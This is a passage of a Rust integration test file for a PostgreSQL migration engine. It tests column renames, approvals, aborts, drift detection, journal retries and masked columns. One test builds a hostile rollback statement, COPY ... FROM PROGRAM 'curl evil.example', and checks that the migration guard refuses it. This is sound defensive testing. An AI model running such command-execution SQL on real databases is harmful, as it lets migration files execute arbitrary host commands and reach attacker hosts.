            LockMode::Acquire,
        )
        .await
        .expect("expand apply_users rename");

    assert!(column_exists(&session, &cfg.project_schema, "apply_users", "email").await);
    assert!(
        column_exists(
            &session,
            &cfg.project_schema,
            "apply_users",
            "email_address"
        )
        .await
    );

    let unapproved = engine
        .resolve_pending_contract(
            &apply_pending,
            Resolution::Applied,
            "app_test",
            Approval::None,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect_err("completion requires explicit approval");
    assert!(matches!(
        unapproved,
        DeclarativeApplyError::Plain(EngineError::ApprovalRequired)
    ));
    let wrong_owner = engine
        .resolve_pending_contract(
            &apply_pending,
            Resolution::Applied,
            "another_app",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect_err("a different owner must not reproduce contract ids");
    assert!(matches!(
        wrong_owner,
        DeclarativeApplyError::Plain(EngineError::PendingContractIdentityMismatch { .. })
    ));

    engine
        .resolve_pending_contract(
            &apply_pending,
            Resolution::Applied,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect("complete apply_users rename");
    assert!(!column_exists(&session, &cfg.project_schema, "apply_users", "email").await);
    assert!(
        column_exists(
            &session,
            &cfg.project_schema,
            "apply_users",
            "email_address"
        )
        .await
    );

    let direct_plan = ExpandContractAuthor::new(cfg.project_schema.clone(), "app_test")
        .author(&OnlineIntent::RenameColumn {
            table: "direct_users".into(),
            from: "email".into(),
            to: "email_address".into(),
            ty: "text".into(),
        })
        .expect("author direct contract rename");
    let direct_contract: Vec<PlanStep> = direct_plan
        .contract
        .iter()
        .cloned()
        .map(PlanStep::Ddl)
        .collect();
    engine
        .apply_plan_with_touched_and_depends(
            &[PlanStep::OnlineRename(RenameStep::PgExpandContract(
                direct_plan,
            ))],
            &["direct_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect("expand direct contract rename");
    session
        .batch(&format!(
            "CREATE VIEW \"{}\".direct_users_old_email AS \
             SELECT email FROM \"{}\".direct_users",
            cfg.project_schema, cfg.project_schema
        ))
        .await
        .expect("block direct source drop");
    engine
        .apply_plan_with_touched_and_depends(
            &direct_contract,
            &["direct_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect_err("direct contract cleanup must roll back atomically");
    let direct_trigger_count: i64 = session
        .query_one(
            "SELECT count(*)::bigint AS n
               FROM pg_trigger trigger
               JOIN pg_class target ON target.oid = trigger.tgrelid
               JOIN pg_namespace namespace ON namespace.oid = target.relnamespace
              WHERE namespace.nspname = $1
                AND target.relname = 'direct_users'
                AND NOT trigger.tgisinternal",
            &[(&cfg.project_schema).into()],
        )
        .await
        .expect("count direct rename triggers")
        .try_get("n")
        .expect("decode direct rename trigger count");
    assert_eq!(direct_trigger_count, 1);
    session
        .batch(&format!(
            "DROP VIEW \"{}\".direct_users_old_email",
            cfg.project_schema
        ))
        .await
        .expect("remove direct source dependency");
    session.fail_next_resolved_pending_contract_insert();
    let append_failure = engine
        .apply_plan_with_touched_and_depends(
            &direct_contract,
            &["direct_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect_err("direct cleanup commits before the injected tombstone append fault");
    assert!(
        append_failure
            .to_string()
            .contains("resolved pending-contract append failed"),
        "the direct path must surface the append failure: {append_failure}"
    );
    assert!(!column_exists(&session, &cfg.project_schema, "direct_users", "email").await);
    assert!(
        column_exists(
            &session,
            &cfg.project_schema,
            "direct_users",
            "email_address"
        )
        .await
    );
    engine
        .apply_plan_with_touched_and_depends(
            &direct_contract,
            &["direct_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect("direct contract retry appends the missing tombstone");

    let abort_plan = ExpandContractAuthor::new(cfg.project_schema.clone(), "app_test")
        .author(&OnlineIntent::RenameColumn {
            table: "abort_users".into(),
            from: "email".into(),
            to: "email_address".into(),
            ty: "text".into(),
        })
        .expect("author abort rename");
    let abort_pending = abort_plan.trigger_version.as_str().to_string();
    let aborted_plan_version = abort_plan
        .plan_version
        .clone()
        .unwrap_or_else(|| abort_plan.expand[0].version.clone());
    engine
        .apply_plan_with_touched_and_depends(
            &[PlanStep::OnlineRename(RenameStep::PgExpandContract(
                abort_plan.clone(),
            ))],
            &["abort_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect("expand abort_users rename");
    engine
        .resolve_pending_contract(
            &abort_pending,
            Resolution::Aborted,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect("abort abort_users rename");
    assert!(column_exists(&session, &cfg.project_schema, "abort_users", "email").await);
    assert!(
        !column_exists(
            &session,
            &cfg.project_schema,
            "abort_users",
            "email_address"
        )
        .await
    );
    assert!(backend
        .pending_contracts()
        .expect("PostgreSQL pending-contract capability")
        .outstanding_pending_contracts(&cfg)
        .await
        .expect("read outstanding contracts")
        .is_empty());

    let replay = engine
        .apply_plan_with_touched_and_depends(
            &[PlanStep::OnlineRename(RenameStep::PgExpandContract(
                abort_plan,
            ))],
            &["abort_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect("replaying an aborted migration is a terminal no-op");
    assert!(
        replay.pending_contract.is_empty(),
        "a resolved migration must not reopen its pending contract"
    );
    assert!(column_exists(&session, &cfg.project_schema, "abort_users", "email").await);
    assert!(
        !column_exists(
            &session,
            &cfg.project_schema,
            "abort_users",
            "email_address"
        )
        .await
    );
    assert!(backend
        .pending_contracts()
        .expect("PostgreSQL pending-contract capability")
        .outstanding_pending_contracts(&cfg)
        .await
        .expect("read outstanding contracts after replay")
        .is_empty());

    let mut dependent = mig(
        MigrationId::derive("aborted_dependency", b"dependent"),
        "dependent_on_aborted_rename",
        &format!(
            "CREATE TABLE \"{}\".must_not_exist (id bigint PRIMARY KEY)",
            cfg.project_schema
        ),
    );
    dependent.depends_on = vec![aborted_plan_version.clone()];
    dependent.recompute_checksum();
    let blocked = engine
        .apply_plan_with_touched_and_depends(
            &[PlanStep::Ddl(dependent)],
            &[],
            &[aborted_plan_version.as_str().to_string()],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect_err("an aborted plan must not satisfy a dependency");
    assert!(matches!(
        blocked,
        DeclarativeApplyError::Plain(EngineError::DependencyAbortedContract { .. })
    ));
    let dependent_table_exists: bool = session
        .query_one(
            "SELECT EXISTS (
                 SELECT 1 FROM information_schema.tables
                  WHERE table_schema = $1 AND table_name = 'must_not_exist'
             ) AS ex",
            &[(&cfg.project_schema).into()],
        )
        .await
        .expect("check dependent table")
        .try_get("ex")
        .expect("decode dependent table check");
    assert!(!dependent_table_exists);

    let partial_abort_plan = ExpandContractAuthor::new(cfg.project_schema.clone(), "app_test")
        .author(&OnlineIntent::RenameColumn {
            table: "abort_partial_users".into(),
            from: "email".into(),
            to: "email_address".into(),
            ty: "text".into(),
        })
        .expect("author partial abort rename");
    let partial_abort_pending = partial_abort_plan.trigger_version.as_str().to_string();
    engine
        .apply_plan_with_touched_and_depends(
            &[PlanStep::OnlineRename(RenameStep::PgExpandContract(
                partial_abort_plan,
            ))],
            &["abort_partial_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect("expand partial abort rename");
    session
        .batch(&format!(
            "CREATE VIEW \"{}\".abort_partial_users_new_email AS \
             SELECT email_address FROM \"{}\".abort_partial_users",
            cfg.project_schema, cfg.project_schema
        ))
        .await
        .expect("block destination-column drop");
    engine
        .resolve_pending_contract(
            &partial_abort_pending,
            Resolution::Aborted,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect_err("the dependent view must interrupt abort cleanup");
    assert!(
        column_exists(
            &session,
            &cfg.project_schema,
            "abort_partial_users",
            "email_address"
        )
        .await
    );
    session
        .batch(&format!(
            "DROP VIEW \"{}\".abort_partial_users_new_email",
            cfg.project_schema
        ))
        .await
        .expect("remove destination-column dependency");
    engine
        .resolve_pending_contract(
            &partial_abort_pending,
            Resolution::Aborted,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect("retry the same abort action");
    assert!(
        column_exists(
            &session,
            &cfg.project_schema,
            "abort_partial_users",
            "email"
        )
        .await
    );
    assert!(
        !column_exists(
            &session,
            &cfg.project_schema,
            "abort_partial_users",
            "email_address"
        )
        .await
    );

    let drift_plan = ExpandContractAuthor::new(cfg.project_schema.clone(), "app_test")
        .author(&OnlineIntent::RenameColumn {
            table: "drift_users".into(),
            from: "email".into(),
            to: "email_address".into(),
            ty: "text".into(),
        })
        .expect("author drift rename");
    let drift_pending = drift_plan.trigger_version.as_str().to_string();
    engine
        .apply_plan_with_touched_and_depends(
            &[PlanStep::OnlineRename(RenameStep::PgExpandContract(
                drift_plan,
            ))],
            &["drift_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect("expand drift rename");
    session
        .batch(&format!(
            "ALTER TABLE \"{}\".drift_users DROP COLUMN email_address",
            cfg.project_schema
        ))
        .await
        .expect("simulate out-of-band destination loss");
    let unsafe_resolution = engine
        .resolve_pending_contract(
            &drift_pending,
            Resolution::Applied,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect_err("missing destination must fail closed");
    assert!(matches!(
        unsafe_resolution,
        DeclarativeApplyError::Plain(EngineError::PendingContractShapeMismatch { .. })
    ));
    let preserved: String = session
        .query_one(
            &format!(
                "SELECT email FROM \"{}\".drift_users WHERE id = 1",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read preserved source value")
        .try_get("email")
        .expect("decode preserved source value");
    assert_eq!(preserved, "preserve@example.test");

    let numeric_plan = ExpandContractAuthor::new(cfg.project_schema.clone(), "app_test")
        .author(&OnlineIntent::RenameColumn {
            table: "numeric_users".into(),
            from: "amount".into(),
            to: "amount_new".into(),
            ty: "numeric(10,2)".into(),
        })
        .expect("author numeric rename");
    let numeric_pending = numeric_plan.trigger_version.as_str().to_string();
    engine
        .apply_plan_with_touched_and_depends(
            &[PlanStep::OnlineRename(RenameStep::PgExpandContract(
                numeric_plan,
            ))],
            &["numeric_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect("expand numeric rename");
    session
        .batch(&format!(
            "ALTER TABLE \"{}\".numeric_users \
                 ALTER COLUMN amount TYPE numeric(10,1), \
                 ALTER COLUMN amount_new TYPE numeric(10,1)",
            cfg.project_schema
        ))
        .await
        .expect("simulate matching but incorrect type modifiers");
    let modifier_drift = engine
        .resolve_pending_contract(
            &numeric_pending,
            Resolution::Applied,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect_err("recorded type modifiers must be enforced");
    assert!(matches!(
        modifier_drift,
        DeclarativeApplyError::Plain(EngineError::PendingContractShapeMismatch { .. })
    ));
    assert!(column_exists(&session, &cfg.project_schema, "numeric_users", "amount").await);
    assert!(column_exists(&session, &cfg.project_schema, "numeric_users", "amount_new").await);

    let timestamp_plan = ExpandContractAuthor::new(cfg.project_schema.clone(), "app_test")
        .author(&OnlineIntent::RenameColumn {
            table: "timestamp_users".into(),
            from: "created_at".into(),
            to: "recorded_at".into(),
            ty: "timestamptz".into(),
        })
        .expect("author timestamp rename with PostgreSQL type alias");
    let timestamp_pending = timestamp_plan.trigger_version.as_str().to_string();
    engine
        .apply_plan_with_touched_and_depends(
            &[PlanStep::OnlineRename(RenameStep::PgExpandContract(
                timestamp_plan,
            ))],
            &["timestamp_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect("expand timestamp rename");
    engine
        .resolve_pending_contract(
            &timestamp_pending,
            Resolution::Applied,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect("resolve timestamptz against timestamp with time zone catalog spelling");
    assert!(
        !column_exists(
            &session,
            &cfg.project_schema,
            "timestamp_users",
            "created_at"
        )
        .await
    );
    assert!(
        column_exists(
            &session,
            &cfg.project_schema,
            "timestamp_users",
            "recorded_at"
        )
        .await
    );
    let retained_timestamp: String = session
        .query_one(
            &format!(
                "SELECT recorded_at::text AS recorded_at \
                   FROM \"{}\".timestamp_users WHERE id = 1",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read renamed timestamp value")
        .try_get("recorded_at")
        .expect("decode renamed timestamp value");
    assert!(retained_timestamp.starts_with("2026-01-02 03:04:05"));

    for (table, named_type) in [
        (
            "enum_users",
            format!("\"{}\".\"item_state\"", cfg.project_schema),
        ),
        (
            "domain_users",
            format!("\"{}\".\"state_code\"", cfg.project_schema),
        ),
    ] {
        let named_plan = ExpandContractAuthor::new(cfg.project_schema.clone(), "app_test")
            .author(&OnlineIntent::RenameColumn {
                table: table.to_string(),
                from: "state".into(),
                to: "status".into(),
                ty: named_type,
            })
            .expect("author named type rename");
        let named_pending = named_plan.trigger_version.as_str().to_string();
        engine
            .apply_plan_with_touched_and_depends(
                &[PlanStep::OnlineRename(RenameStep::PgExpandContract(
                    named_plan,
                ))],
                &[table.to_string()],
                &[],
                Approval::Approved,
                &backend,
                &cfg,
                "app_test",
                LockMode::Acquire,
            )
            .await
            .expect("expand named type rename");
        engine
            .resolve_pending_contract(
                &named_pending,
                Resolution::Applied,
                "app_test",
                Approval::Approved,
                &backend,
                &cfg,
                "operator",
            )
            .await
            .expect("resolve named type rename");
        assert!(!column_exists(&session, &cfg.project_schema, table, "state").await);
        assert!(column_exists(&session, &cfg.project_schema, table, "status").await);
        let retained: String = session
            .query_one(
                &format!(
                    "SELECT status::text AS status FROM \"{}\".\"{}\" WHERE id = 1",
                    cfg.project_schema, table
                ),
                &[],
            )
            .await
            .expect("read renamed named type value")
            .try_get("status")
            .expect("decode renamed named type value");
        assert_eq!(retained, "ready");
    }

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn a_partially_journaled_resolution_cannot_switch_actions() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    session
        .batch(&format!(
            "CREATE TABLE \"{}\".legacy_apply_users (id bigint PRIMARY KEY, email text); \
             INSERT INTO \"{}\".legacy_apply_users VALUES (1, 'apply@example.test'); \
             CREATE TABLE \"{}\".legacy_abort_users (id bigint PRIMARY KEY, email text); \
             INSERT INTO \"{}\".legacy_abort_users VALUES (1, 'abort@example.test')",
            cfg.project_schema, cfg.project_schema, cfg.project_schema, cfg.project_schema,
        ))
        .await
        .expect("create legacy partial-resolution fixtures");

    let backend = PostgresBackend::new_generic(&session);
    let engine = MigrationEngine::new();
    let author = ExpandContractAuthor::new(cfg.project_schema.clone(), "app_test");

    let apply_intent = OnlineIntent::RenameColumn {
        table: "legacy_apply_users".into(),
        from: "email".into(),
        to: "email_address".into(),
        ty: "text".into(),
    };
    let apply_plan = author
        .author(&apply_intent)
        .expect("author legacy apply fixture");
    let apply_pending = apply_plan.trigger_version.as_str().to_string();
    engine
        .apply_plan_with_touched_and_depends(
            &[PlanStep::OnlineRename(RenameStep::PgExpandContract(
                apply_plan.clone(),
            ))],
            &["legacy_apply_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect("open legacy apply fixture");

    apply(
        &session,
        &cfg,
        std::slice::from_ref(&apply_plan.contract[0]),
        Approval::Approved,
        "legacy_operator",
    )
    .await
    .expect("run and journal only legacy apply C1");

    let switch_to_abort = engine
        .resolve_pending_contract(
            &apply_pending,
            Resolution::Aborted,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect_err("a partially applied contract must not switch to abort");
    assert!(matches!(
        switch_to_abort,
        DeclarativeApplyError::Plain(EngineError::PendingContractResolutionConflict {
            ref version,
            started: "apply",
        }) if version == &apply_pending
    ));
    assert!(column_exists(&session, &cfg.project_schema, "legacy_apply_users", "email").await);
    assert!(
        column_exists(
            &session,
            &cfg.project_schema,
            "legacy_apply_users",
            "email_address"
        )
        .await
    );

    engine
        .resolve_pending_contract(
            &apply_pending,
            Resolution::Applied,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect("retry the partially started apply action");
    assert!(!column_exists(&session, &cfg.project_schema, "legacy_apply_users", "email").await);
    assert!(
        column_exists(
            &session,
            &cfg.project_schema,
            "legacy_apply_users",
            "email_address"
        )
        .await
    );

    let abort_intent = OnlineIntent::RenameColumn {
        table: "legacy_abort_users".into(),
        from: "email".into(),
        to: "email_address".into(),
        ty: "text".into(),
    };
    let abort_plan = author
        .author(&abort_intent)
        .expect("author legacy abort fixture");
    let abort_pending = abort_plan.trigger_version.as_str().to_string();
    engine
        .apply_plan_with_touched_and_depends(
            &[PlanStep::OnlineRename(RenameStep::PgExpandContract(
                abort_plan,
            ))],
            &["legacy_abort_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect("open legacy abort fixture");

    let mut abort_c1 = author
        .author_abort(&abort_intent)
        .expect("author legacy abort cleanup")
        .remove(0);
    abort_c1.version = legacy_abort_resolution_version(&abort_pending, 0);
    abort_c1.recompute_checksum();
    apply(
        &session,
        &cfg,
        std::slice::from_ref(&abort_c1),
        Approval::Approved,
        "legacy_operator",
    )
    .await
    .expect("run and journal only legacy abort C1");

    let switch_to_apply = engine
        .resolve_pending_contract(
            &abort_pending,
            Resolution::Applied,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect_err("a partially aborted contract must not switch to apply");
    assert!(matches!(
        switch_to_apply,
        DeclarativeApplyError::Plain(EngineError::PendingContractResolutionConflict {
            ref version,
            started: "abort",
        }) if version == &abort_pending
    ));
    assert!(column_exists(&session, &cfg.project_schema, "legacy_abort_users", "email").await);
    assert!(
        column_exists(
            &session,
            &cfg.project_schema,
            "legacy_abort_users",
            "email_address"
        )
        .await
    );

    engine
        .resolve_pending_contract(
            &abort_pending,
            Resolution::Aborted,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect("retry the partially started abort action");
    assert!(column_exists(&session, &cfg.project_schema, "legacy_abort_users", "email").await);
    assert!(
        !column_exists(
            &session,
            &cfg.project_schema,
            "legacy_abort_users",
            "email_address"
        )
        .await
    );

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn a_failed_resolution_tombstone_append_retries_without_repeating_cleanup() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    session
        .batch(&format!(
            "CREATE TABLE \"{}\".tombstone_retry_users (id bigint PRIMARY KEY, email text); \
             INSERT INTO \"{}\".tombstone_retry_users VALUES (1, 'retry@example.test')",
            cfg.project_schema, cfg.project_schema,
        ))
        .await
        .expect("create tombstone retry fixture");

    let backend = PostgresBackend::new_generic(&session);
    let engine = MigrationEngine::new();
    let plan = ExpandContractAuthor::new(cfg.project_schema.clone(), "app_test")
        .author(&OnlineIntent::RenameColumn {
            table: "tombstone_retry_users".into(),
            from: "email".into(),
            to: "email_address".into(),
            ty: "text".into(),
        })
        .expect("author tombstone retry rename");
    let pending_version = plan.trigger_version.as_str().to_string();
    engine
        .apply_plan_with_touched_and_depends(
            &[PlanStep::OnlineRename(RenameStep::PgExpandContract(plan))],
            &["tombstone_retry_users".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect("open tombstone retry obligation");

    session.fail_next_resolved_pending_contract_insert();
    let append_failure = engine
        .resolve_pending_contract(
            &pending_version,
            Resolution::Applied,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect_err("the injected tombstone append fault must surface");
    assert!(
        append_failure
            .to_string()
            .contains("resolved pending-contract append failed"),
        "the injected append failure should be preserved: {append_failure}"
    );

    assert!(
        !column_exists(
            &session,
            &cfg.project_schema,
            "tombstone_retry_users",
            "email"
        )
        .await
    );
    assert!(
        column_exists(
            &session,
            &cfg.project_schema,
            "tombstone_retry_users",
            "email_address"
        )
        .await
    );
    let atomic_version =
        MigrationId::derive("resolve_pending_apply_atomic", pending_version.as_bytes());
    let journal = zero_migrate::applied(&session, &cfg)
        .await
        .expect("read journal after append fault");
    assert!(
        journal
            .iter()
            .any(|entry| entry.version == atomic_version.as_str()),
        "atomic cleanup must be journaled before the tombstone append fails"
    );
    let outstanding = backend
        .pending_contracts()
        .expect("PostgreSQL pending-contract capability")
        .outstanding_pending_contracts(&cfg)
        .await
        .expect("read obligation after append fault");
    assert_eq!(outstanding.len(), 1);
    assert_eq!(outstanding[0].pending_version, pending_version);

    engine
        .resolve_pending_contract(
            &pending_version,
            Resolution::Applied,
            "app_test",
            Approval::Approved,
            &backend,
            &cfg,
            "operator",
        )
        .await
        .expect("same-action retry should append the missing tombstone");

    assert!(backend
        .pending_contracts()
        .expect("PostgreSQL pending-contract capability")
        .outstanding_pending_contracts(&cfg)
        .await
        .expect("read obligations after retry")
        .is_empty());
    let resolved = backend
        .pending_contracts()
        .expect("PostgreSQL pending-contract capability")
        .resolved_pending_contracts(&cfg)
        .await
        .expect("read terminal tombstone after retry");
    assert_eq!(resolved.len(), 1);
    assert_eq!(resolved[0].contract.pending_version, pending_version);
    assert_eq!(resolved[0].resolution, Resolution::Applied);

    let retained: String = session
        .query_one(
            &format!(
                "SELECT email_address FROM \"{}\".tombstone_retry_users WHERE id = 1",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read retained destination value")
        .try_get("email_address")
        .expect("decode retained destination value");
    assert_eq!(retained, "retry@example.test");

    drop_schemas(&session, &cfg).await;
}

/// A hostile `down` is refused by the guard before it reaches the database.
///
/// `down` is SQL from the migration file, exactly like `up`. Without a line-1 check
/// over it, `down` is a way to run precisely what `up` is refused: an author whose
/// `up` is guard-denied can put the same statement in `down` and have it execute the
/// moment anything rolls back. The migrator role is line 2, not a substitute.
#[compio::test]
async fn a_guard_denied_down_is_refused_before_it_runs() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let v = MigrationId::generate();
    let up = format!(
        "CREATE TABLE \"{}\".keep_me (id bigint)",
        cfg.project_schema
    );
    // A `down` the guard hard-denies: host command execution.
    let down = format!(
        "COPY \"{}\".keep_me FROM PROGRAM 'curl evil.example'",
        cfg.project_schema
    );
    let m = mig_with_down(v.clone(), "hostile_down", &up, &down);

    apply(
        &session,
        &cfg,
        std::slice::from_ref(&m),
        Approval::None,
        "app_test",
    )
    .await
    .expect("the up is benign and applies");

    let backend = PostgresBackend::new_generic(&session);
    let err = backend
        .rollback_one_transactional(&cfg, &m, "operator")
        .await
        .expect_err("a guard-denied down must not reach the database");
    assert!(
        matches!(err, zero_migrate::RollbackError::Guard { .. }),
        "expected a Guard refusal, got {err:?}"
    );

    // The refusal is total: nothing ran, so the table is still there and the
    // migration is still net-applied.
    assert!(
        table_exists(&session, &cfg.project_schema, "keep_me").await,
        "a refused rollback must not have touched the schema"
    );

    drop_schemas(&session, &cfg).await;
}

// ---------------------------------------------------------------------------
// Scenario - a guarded MASKED addColumn is a TWO-OBJECT op
// ---------------------------------------------------------------------------

/// Lower a masked `addColumn` through the shipped `IrAuthor` on the PostgreSQL
/// dialect, with or without the `ifNotExists` guard. Returns the lowered units in
/// plan order: unit 0 adds the MAIN column, unit 1 adds the `<column>_masked` sibling
/// plus its `zero-migrate:mask` sentinel `COMMENT`. `ir_name` seeds the deterministic
/// unit versions, so two calls with different names describe the same op as two
/// independent plans.
fn lower_masked_add_column(cfg: &ExecutorConfig, ir_name: &str, guarded: bool) -> Vec<Migration> {
    let guard = if guarded {
        r#","existenceGuard":"ifNotExists""#
    } else {
        ""
    };
    let authored: MigrationIr = serde_json::from_str(&format!(
        r#"{{"ir_version":1,"name":"{ir_name}","ops":[
          {{"op":"addColumn","table":"accounts","column":"ssn","type":"text",
            "nullable":true,"mask":{{"kind":"last4","classification":"pii"}}{guard}}}
        ]}}"#
    ))
    .expect("parse the masked addColumn IR");
    let resolved =
        resolve_create_table_policy(&authored, &support::no_inject("app"), &cfg.project_schema)
            .expect("resolve the no-inject table policy");
    IrAuthor::new(
        &cfg.project_schema,
        "app_test",
        SqlDialect::Postgres,
        &support::no_inject("app"),
    )
    .lower(&resolved, &LiveSchema::default())
    .expect("the masked addColumn lowers on PostgreSQL")
}

/// Is `version` net-applied in the journal?
async fn journal_applied(
    session: &PgDevSession,
    cfg: &ExecutorConfig,
    version: &MigrationId,
) -> bool {
    zero_migrate::applied(session, cfg)
        .await
        .expect("journal read")
        .iter()
        .any(|e| e.version == version.as_str())
}

/// A masked `addColumn` lowers to TWO units over TWO DIFFERENT objects - the MAIN
/// column and the `<col>_masked` sibling - and `apply_transactional` gives each unit
/// its own transaction and its own journal row. Unit 0 has therefore already COMMITTED
/// by the time unit 1 takes its catalog snapshot, in the same batch and on a clean
/// database.
///
/// The failure this pins is the #81 shape on a new op: unit 1's existence guard names
/// the MAIN column rather than the sibling, so it probes `ssn`, finds it present and
/// matching (unit 0 just added it), returns `SatisfiedNoop`, SKIPS the sibling's `ADD
/// COLUMN` - and still journals the unit completed. Silent skip under a green journal,
/// and the runtime mask read-pass has no sibling to write to.
///
/// Asserts the PAIR from the server, because neither half alone is the defect: a
/// journaled-but-absent sibling is the bug; an absent sibling with the unit still
/// pending would merely be an incomplete deploy.
///
/// Does NOT cover MySQL, and nothing else covers it: that backend evaluates no probe
/// at all, so the guard is dropped and the bare DDL runs. A separate defect, noted
/// rather than silently narrowed.
///
/// Asserts the sibling COLUMN only, not the `zero-migrate:mask` sentinel `COMMENT`
/// riding the same `up`. The sentinel's EMISSION is owned by
/// `ir_author_render_parity.rs` (the `COMMENT ON COLUMN` side output) and its
/// live-catalog RECOVERY is owned by `sqlite_drift.rs` on the SQLite side; what no
/// test in this workspace does is read the sentinel back out of a live PostgreSQL
/// catalog. That residue is a hole.
#[compio::test]
async fn a_guarded_masked_add_column_adds_the_sibling_on_a_clean_first_apply() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let base = mig(
        MigrationId::generate(),
        "base",
        &format!(
            "CREATE TABLE \"{}\".accounts (id bigint PRIMARY KEY)",
            cfg.project_schema
        ),
    );
    let units = lower_masked_add_column(&cfg, "masked_add_fresh", true);
    assert_eq!(
        units.len(),
        2,
        "a masked addColumn lowers to the main column plus the `_masked` sibling"
    );

    let mut plan = vec![base.clone()];
    plan.extend(units.iter().cloned());
    apply(&session, &cfg, &plan, Approval::None, "app_test")
        .await
        .expect("the guarded masked addColumn applies");

    assert!(
        column_exists(&session, &cfg.project_schema, "accounts", "ssn").await,
        "unit 0 added the main column"
    );
    assert!(
        journal_applied(&session, &cfg, &units[1].version).await,
        "the sibling unit journaled as applied"
    );
    assert!(
        column_exists(&session, &cfg.project_schema, "accounts", "ssn_masked").await,
        "the sibling unit journaled green, so `ssn_masked` must exist on the server"
    );

    drop_schemas(&session, &cfg).await;
}

/// The same defect across a PROCESS RESTART rather than within one batch. Unit 0
/// committed its DDL and its journal row in one transaction and unit 1 never ran, so
/// the arming below is the exact durable state a process death between the two units
/// leaves behind. The resume re-derives unit 1 as pending and must create the sibling.
///
/// Distinct from the clean-apply arm above because the probe here reads a catalog
/// written by an EARLIER apply invocation, which is the state the `ifNotExists` guard
/// exists to make re-runnable.
#[compio::test]
async fn a_crash_between_the_masked_add_column_units_still_adds_the_sibling_on_resume() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let base = mig(
        MigrationId::generate(),
        "base",
        &format!(
            "CREATE TABLE \"{}\".accounts (id bigint PRIMARY KEY)",
            cfg.project_schema
        ),
    );
    apply(
        &session,
        &cfg,
        std::slice::from_ref(&base),
        Approval::None,
        "app_test",
    )
    .await
    .expect("apply the base table");

    let units = lower_masked_add_column(&cfg, "masked_add_crash", true);

    // ARM the post-crash state: apply the plan truncated after unit 0.
    apply(
        &session,
        &cfg,
        &[base.clone(), units[0].clone()],
        Approval::None,
        "app_test",
    )
    .await
    .expect("unit 0 applies");
    assert!(
        !column_exists(&session, &cfg.project_schema, "accounts", "ssn_masked").await,
        "the crash landed before unit 1, so the sibling is absent"
    );
    assert!(
        !journal_applied(&session, &cfg, &units[1].version).await,
        "unit 1 never journaled, so the resume sees it pending"
    );

    // RESUME - the same plan, now complete.
    apply(
        &session,
        &cfg,
        &[base.clone(), units[0].clone(), units[1].clone()],
        Approval::None,
        "app_test",
    )
    .await
    .expect("the resume applies");

    assert!(
